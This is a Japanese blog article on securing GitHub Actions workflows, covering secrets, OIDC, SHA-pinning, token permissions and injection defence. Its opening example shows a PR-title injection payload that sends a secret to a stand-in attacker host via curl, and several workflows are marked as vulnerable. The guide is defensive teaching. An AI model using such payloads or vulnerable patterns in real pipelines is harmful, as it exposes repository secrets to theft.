---
title: 'GitHub Actionsセキュリティガイド: ワークフローの安全な運用'
description: 'GitHub Actionsのセキュリティリスクと対策を徹底解説。シークレット管理、OIDC認証、サプライチェーン攻撃対策、権限最小化、セキュリティ監査、CIパイプラインの堅牢化まで実践的にカバー。GitHub Actions・セキュリティ・DevSecOpsに関する実践情報。'
pubDate: '2025-04-05'
updatedDate: '2025-04-05'
tags: ['GitHub Actions', 'セキュリティ', 'DevSecOps', 'CICD', 'OIDC', 'インフラ']
heroImage: '../../assets/thumbnails/github-actions-security-guide.jpg'
---
## GitHub Actionsのセキュリティリスク

GitHub Actionsは便利ですが、適切な対策を講じないと重大なセキュリティリスクを招きます。

### 主要なリスク

1. **シークレット漏洩** - 環境変数やログへの誤出力
2. **サプライチェーン攻撃** - 悪意のあるアクションの実行
3. **権限昇格** - 過剰な権限付与
4. **コードインジェクション** - ユーザー入力の不適切な処理
5. **クレデンシャルの永続化** - 長期間有効な認証情報

### 実際の攻撃例

```yaml
# ❌ 危険: PRタイトルをそのまま実行
name: Vulnerable Workflow
on:
  pull_request:
    types: [opened]

jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - name: Echo PR title
        run: echo "PR title: ${{ github.event.pull_request.title }}"
        # 攻撃者がタイトルに `"; curl attacker.com?token=$SECRET "` を入れると実行される
```

この脆弱性により、機密情報が外部に送信される可能性があります。

## シークレット管理のベストプラクティス

### 1. 環境変数ではなくSecretsを使う

```yaml
# ❌ 危険: 直接記述
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Deploy
        run: |
          curl -X POST https://api.example.com/deploy \
            -H "Authorization: Bearer sk_live_abc123xyz"

# ✅ 安全: Secretsを使用
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Deploy
        run: |
          curl -X POST https://api.example.com/deploy \
            -H "Authorization: Bearer ${{ secrets.API_TOKEN }}"
```

### 2. Secretsのスコープを制限

```yaml
# Repository Secretsではなく、Environment Secretsを使う
jobs:
  deploy-production:
    runs-on: ubuntu-latest
    environment:
      name: production # この環境にのみシークレットを公開
    steps:
      - name: Deploy
        run: ./deploy.sh
        env:
          API_KEY: ${{ secrets.PRODUCTION_API_KEY }}
```

**環境の保護ルール:**
- Required reviewers（承認者が必要）
- Wait timer（待機時間を設定）
- Deployment branches（特定のブランチのみ）

### 3. ログへの漏洩を防ぐ

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Build
        run: |
          # デバッグ出力を避ける
          npm run build
        env:
          SECRET_KEY: ${{ secrets.SECRET_KEY }}

      # ❌ 危険: 環境変数を出力
      - name: Debug (BAD)
        run: env

      # ✅ 安全: マスク処理
      - name: Set masked value
        run: |
          echo "::add-mask::${{ secrets.SECRET_KEY }}"
          echo "Secret is masked in logs"
```

### 4. Secretsのローテーション

```typescript
// scripts/rotate-secrets.ts
import { Octokit } from '@octokit/rest';
import sodium from 'libsodium-wrappers';

async function rotateSecret(
  owner: string,
  repo: string,
  secretName: string,
  newValue: string
) {
  const octokit = new Octokit({ auth: process.env.GITHUB_TOKEN });

  // 公開鍵を取得
  const { data: publicKey } = await octokit.actions.getRepoPublicKey({
    owner,
    repo,
  });

  // 暗号化
  await sodium.ready;
  const binkey = sodium.from_base64(publicKey.key, sodium.base64_variants.ORIGINAL);
  const binsec = sodium.from_string(newValue);
  const encBytes = sodium.crypto_box_seal(binsec, binkey);
  const encrypted = sodium.to_base64(encBytes, sodium.base64_variants.ORIGINAL);

  // Secretを更新
  await octokit.actions.createOrUpdateRepoSecret({
    owner,
    repo,
    secret_name: secretName,
    encrypted_value: encrypted,
    key_id: publicKey.key_id,
  });

  console.log(`Secret ${secretName} rotated successfully`);
}

// 使用例
rotateSecret('myorg', 'myrepo', 'API_TOKEN', 'new-token-value');
```

## OIDC（OpenID Connect）による認証

長期間有効なトークンを避け、短命なトークンを動的に取得します。

### AWS へのデプロイ（OIDC）

```yaml
# .github/workflows/deploy-aws.yml
name: Deploy to AWS
on:
  push:
    branches: [main]

permissions:
  id-token: write # OIDC トークン取得に必要
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsRole
          aws-region: us-east-1

      - name: Deploy to S3
        run: |
          aws s3 sync ./dist s3://my-bucket/
```

**AWS側の設定（Terraform）:**

```hcl
# GitHub OIDC プロバイダー
resource "aws_iam_openid_connect_provider" "github" {
  url = "https://token.actions.githubusercontent.com"

  client_id_list = ["sts.amazonaws.com"]

  thumbprint_list = [
    "6938fd4d98bab03faadb97b34396831e3780aea1"
  ]
}

# IAM ロール
resource "aws_iam_role" "github_actions" {
  name = "GitHubActionsRole"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          Federated = aws_iam_openid_connect_provider.github.arn
        }
        Action = "sts:AssumeRoleWithWebIdentity"
        Condition = {
          StringEquals = {
            "token.actions.githubusercontent.com:aud" = "sts.amazonaws.com"
          }
          StringLike = {
            "token.actions.githubusercontent.com:sub" = "repo:myorg/myrepo:*"
          }
        }
      }
    ]
  })
}

# S3への書き込み権限
resource "aws_iam_role_policy" "github_actions_s3" {
  role = aws_iam_role.github_actions.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect   = "Allow"
        Action   = ["s3:PutObject", "s3:ListBucket"]
        Resource = ["arn:aws:s3:::my-bucket/*", "arn:aws:s3:::my-bucket"]
      }
    ]
  })
}
```

### Google Cloud へのデプロイ（OIDC）

```yaml
name: Deploy to GCP
on:
  push:
    branches: [main]

permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Authenticate to Google Cloud
        uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: 'projects/123456789/locations/global/workloadIdentityPools/github/providers/github-provider'
          service_account: 'github-actions@my-project.iam.gserviceaccount.com'

      - name: Deploy to Cloud Run
        run: |
          gcloud run deploy myapp \
            --image gcr.io/my-project/myapp:${{ github.sha }} \
            --region us-central1
```

## サプライチェーン攻撃対策

### 1. アクションのバージョンをハッシュで固定

```yaml
# ❌ 危険: タグ参照（変更される可能性）
- uses: actions/checkout@v4

# ⚠️ より安全: セマンティックバージョン
- uses: actions/checkout@v4.1.1

# ✅ 最も安全: SHAハッシュで固定
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
```

**自動化ツール:**
```bash
# Dependabotで自動更新
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

### 2. サードパーティアクションの監査

```yaml
# 信頼できるアクションのみ使用
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      # ✅ GitHub公式
      - uses: actions/checkout@v4

      # ✅ 検証済みクリエイター（青いバッジ）
      - uses: docker/build-push-action@v5

      # ⚠️ 個人アカウント - レビュー必須
      - uses: random-user/unknown-action@v1
```

**監査チェックリスト:**
- [ ] 作者が信頼できるか（GitHub公式、検証済みクリエイター）
- [ ] スター数とフォーク数
- [ ] 最終更新日（メンテナンスされているか）
- [ ] ソースコードレビュー
- [ ] セキュリティ監査レポート

### 3. アクションのスコープを制限

```yaml
# self-hosted runnerではアクションを制限
permissions:
  actions: read
  contents: read
  # 他の権限は明示的に付与しない
```

## 権限の最小化（GITHUB_TOKEN）

### デフォルト権限を制限

```yaml
# リポジトリ設定: Settings → Actions → General → Workflow permissions
# "Read repository contents and packages permissions" を選択
```

```yaml
# ワークフローごとに必要な権限のみ付与
name: Deploy
on: push

permissions:
  contents: read # コードの読み取りのみ
  id-token: write # OIDC用

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Deploy
        run: ./deploy.sh
```

### 権限スコープの例

```yaml
# 最小権限
permissions:
  contents: read

# パッケージ公開
permissions:
  contents: read
  packages: write

# PRコメント
permissions:
  contents: read
  pull-requests: write

# リリース作成
permissions:
  contents: write

# すべて拒否（サードパーティアクションのみ使用）
permissions: {}
```

## コードインジェクション対策

### 1. ユーザー入力の適切な処理

```yaml
# ❌ 危険: PRタイトルを直接実行
- name: Echo title (VULNERABLE)
  run: echo "Title: ${{ github.event.pull_request.title }}"

# ✅ 安全: 環境変数経由
- name: Echo title (SAFE)
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $PR_TITLE"
```

### 2. `pull_request_target`の安全な使用

`pull_request_target`はフォークPRでもシークレットにアクセスできるため危険です。

```yaml
# ❌ 危険: pull_request_targetでコードを実行
on:
  pull_request_target:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build # 攻撃者のコードが実行される

# ✅ 安全: pull_requestを使うか、チェックアウト前に検証
on:
  pull_request_target:

jobs:
  comment:
    runs-on: ubuntu-latest
    steps:
      # コードをチェックアウトせず、コメントのみ
      - name: Comment on PR
        uses: actions/github-script@v7
        with:
          script: |
            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: 'Thank you for your contribution!'
            })
```

### 3. スクリプトインジェクション防止

```yaml
# ❌ 危険: GitHub Scriptでユーザー入力を直接使用
- uses: actions/github-script@v7
  with:
    script: |
      const title = "${{ github.event.issue.title }}";
      console.log(title);

# ✅ 安全: contextオブジェクトを使用
- uses: actions/github-script@v7
  with:
    script: |
      const title = context.payload.issue.title;
      console.log(title);
```

## セキュリティ監査とモニタリング

### 1. Dependabotでの脆弱性検出

```yaml
# .github/dependabot.yml
version: 2
updates:
  # npm依存関係
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "daily"
    open-pull-requests-limit: 10

  # GitHub Actions
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"

  # Docker
  - package-ecosystem: "docker"
    directory: "/"
    schedule:
      interval: "weekly"
```

### 2. CodeQLによる静的解析

```yaml
name: CodeQL Analysis
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 0 * * 1' # 毎週月曜日

jobs:
  analyze:
    name: Analyze
    runs-on: ubuntu-latest

    permissions:
      actions: read
      contents: read
      security-events: write

    strategy:
      matrix:
        language: ['javascript', 'typescript', 'python']

    steps:
      - uses: actions/checkout@v4

      - name: Initialize CodeQL
        uses: github/codeql-action/init@v3
        with:
          languages: ${{ matrix.language }}

      - name: Autobuild
        uses: github/codeql-action/autobuild@v3

      - name: Perform CodeQL Analysis
        uses: github/codeql-action/analyze@v3
```

### 3. セキュリティスコアカード

```yaml
name: Scorecard
on:
  schedule:
    - cron: '0 0 * * 0' # 毎週日曜日

permissions: read-all

jobs:
  analysis:
    runs-on: ubuntu-latest
    permissions:
      security-events: write
      id-token: write

    steps:
      - uses: actions/checkout@v4

      - name: Run Scorecard
        uses: ossf/scorecard-action@v2
        with:
          results_file: results.sarif
          results_format: sarif
          publish_results: true

      - name: Upload to GitHub Security
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: results.sarif
```

### 4. ログ監視とアラート

```yaml
name: Security Audit
on:
  workflow_run:
    workflows: ["*"]
    types: [completed]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - name: Check for secret exposure
        uses: actions/github-script@v7
        with:
          script: |
            const { data: logs } = await github.rest.actions.downloadWorkflowRunLogs({
              owner: context.repo.owner,
              repo: context.repo.repo,
              run_id: context.payload.workflow_run.id,
            });

            // シークレットパターンの検出
            const patterns = [
              /AKIA[0-9A-Z]{16}/, // AWS Access Key
              /sk_live_[0-9a-zA-Z]{24,}/, // Stripe
              /ghp_[0-9a-zA-Z]{36}/, // GitHub Token
            ];

            for (const pattern of patterns) {
              if (pattern.test(logs)) {
                core.setFailed('Potential secret exposure detected!');
              }
            }
```

## Self-hosted Runnerのセキュリティ

### 1. 分離された環境

```yaml
# パブリックリポジトリではself-hosted runnerを使わない
jobs:
  build:
    runs-on: ubuntu-latest # GitHub-hostedを使用

# プライベートリポジトリのみでself-hosted
jobs:
  deploy:
    runs-on: self-hosted
    if: github.repository == 'myorg/private-repo'
```

### 2. Runnerの自動クリーンアップ

```bash
#!/bin/bash
# cleanup-runner.sh

# Dockerコンテナ内でジョブを実行
docker run --rm \
  -v /var/run/docker.sock:/var/run/docker.sock \
  -v $(pwd):/workspace \
  -w /workspace \
  myorg/runner:latest \
  ./run-job.sh

# 実行後にすべてをクリーンアップ
docker system prune -af
```

### 3. ネットワーク分離

```yaml
# Runnerを専用のVPCに配置
# AWSの例
resource "aws_security_group" "runner" {
  name_prefix = "github-runner-"
  vpc_id      = aws_vpc.main.id

  egress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"] # HTTPSのみ許可
  }
}
```

## 実践的なセキュアワークフロー

### フロントエンドのデプロイ

```yaml
name: Deploy Frontend
on:
  push:
    branches: [main]

permissions:
  contents: read
  id-token: write

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://myapp.com

    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1

      - name: Setup Node
        uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f8 # v4.0.2
        with:
          node-version: '20'
          cache: 'npm'

      - name: Install dependencies
        run: npm ci

      - name: Build
        run: npm run build
        env:
          NEXT_PUBLIC_API_URL: ${{ vars.API_URL }}

      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
          aws-region: us-east-1

      - name: Deploy to S3
        run: |
          aws s3 sync ./out s3://${{ secrets.S3_BUCKET }}/ --delete

      - name: Invalidate CloudFront
        run: |
          aws cloudfront create-invalidation \
            --distribution-id ${{ secrets.CLOUDFRONT_DIST_ID }} \
            --paths "/*"
```

### バックエンドのCI/CD

```yaml
name: Backend CI/CD
on:
  pull_request:
    branches: [main]
  push:
    branches: [main]

permissions:
  contents: read
  packages: write
  security-events: write

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Run tests
        run: |
          docker compose up -d postgres
          npm ci
          npm test

      - name: Security scan
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          scan-ref: '.'
          format: 'sarif'
          output: 'trivy-results.sarif'

      - name: Upload scan results
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: 'trivy-results.sarif'

  deploy:
    needs: test
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment: production

    steps:
      - uses: actions/checkout@v4

      - name: Build Docker image
        run: docker build -t myapp:${{ github.sha }} .

      - name: Scan image
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: myapp:${{ github.sha }}
          exit-code: '1'
          severity: 'CRITICAL,HIGH'

      - name: Push to registry
        run: |
          echo ${{ secrets.GITHUB_TOKEN }} | docker login ghcr.io -u ${{ github.actor }} --password-stdin
          docker tag myapp:${{ github.sha }} ghcr.io/${{ github.repository }}:latest
          docker push ghcr.io/${{ github.repository }}:latest
```

## まとめ

GitHub Actionsのセキュリティは、継続的な取り組みが必要です。

**重要なポイント:**

1. **シークレット管理** - Secrets、Environment、OIDC認証
2. **権限最小化** - 必要な権限のみ付与
3. **サプライチェーン** - アクションをSHAで固定、監査
4. **コードインジェクション** - ユーザー入力を環境変数経由で処理
5. **監視と監査** - CodeQL、Dependabot、Scorecard

**チェックリスト:**
- [ ] デフォルトのGITHUB_TOKEN権限を制限
- [ ] OIDC認証を使用（長期トークンを避ける）
- [ ] アクションをSHAハッシュで固定
- [ ] 環境保護ルールを設定
- [ ] CodeQLとDependabotを有効化
- [ ] pull_request_targetの使用を避ける
- [ ] ログに機密情報が出力されないか確認

セキュアなCI/CDパイプラインを構築することで、開発速度を維持しながら、組織のセキュリティ態勢を強化できます。
---

## 関連記事

- [プログラミングスクール比較2026年版【現役エンジニアが選ぶ厳選8校】](/blog/2026-03-08-programming-school-comparison-2026)
- [エンジニア転職完全ガイド2026【未経験・経験者別ロードマップ】](/blog/2026-03-09-engineer-career-change-guide-2026)
